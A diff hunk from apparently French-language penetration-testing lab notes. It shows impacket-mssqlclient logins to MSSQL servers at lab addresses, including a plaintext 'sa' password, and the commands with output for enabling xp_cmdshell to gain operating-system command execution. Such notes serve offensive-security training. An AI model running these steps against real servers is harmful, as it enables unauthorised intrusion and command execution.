@@ -357,7 +357,7 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
   	6. On importe le zip dans l'interface graphique 
 
 - Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
-  	- Activer le `xp_cmdshell` : 
+  	- Activer le `xp_cmdshell` --> `enable_xp_cmdshell` ou ⬇️ 
 ```mssql=
 SQL (sophie  dbo@master)> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
 [*] INFO(DANTE-SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
